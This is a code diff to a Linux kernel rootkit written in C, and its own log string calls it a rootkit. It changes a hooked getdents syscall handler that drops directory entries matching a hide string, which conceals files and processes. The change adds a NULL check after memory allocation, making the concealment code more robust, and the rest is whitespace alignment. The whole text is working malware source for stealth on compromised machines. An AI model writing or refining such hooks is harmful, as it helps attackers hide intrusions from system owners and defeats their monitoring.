@@ -110,18 +110,22 @@ hook_define(2, long, kill, pid_t, pid, int, sig)
 static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
 	int buff_offset, deleted_size;                                                                   \
 	struct linux_dirent##v* currnt;                                                                  \
-	struct linux_dirent##v* my_dirent; \
+	struct linux_dirent##v* my_dirent;                                                               \
 	bool del;                                                                                        \
 	unsigned long pid;                                                                               \
 	long ret;                                                                                        \
 \
 	ret = sys_getdents##v##_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent##v __user*, dirent, unsigned int, count)); \
 \
-	my_dirent = kmalloc(ret, GFP_KERNEL); \
-	copy_from_user(my_dirent, dirent, ret); \
+	my_dirent = kmalloc(ret, GFP_KERNEL);                                                            \
+	if (my_dirent == NULL){                                                                          \
+		log("ROOTKIT: ERROR kmalloc(%d) in getdents hook", ret);                                     \
+		return -1;                                                                                   \
+	}                                                                                                \
+	copy_from_user(my_dirent, dirent, ret);                                                          \
 	buff_offset = 0;                                                                                 \
 	while (buff_offset < ret){                                                                       \
-		currnt = (struct linux_dirent##v*)((char*)my_dirent + buff_offset);                             \
+		currnt = (struct linux_dirent##v*)((char*)my_dirent + buff_offset);                          \
 		del = false;                                                                                 \
 		if (strstr(currnt->d_name, HIDE_STR) != NULL)                                                \
 			del = true;                                                                              \
@@ -142,8 +146,8 @@ static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_d
 			buff_offset += currnt->d_reclen;                                                         \
 \
 	}                                                                                                \
-	copy_to_user(dirent, my_dirent, ret); \
-	kfree(my_dirent); \
+	copy_to_user(dirent, my_dirent, ret);                                                            \
+	kfree(my_dirent);                                                                                \
 	return ret;                                                                                      \
 }
 
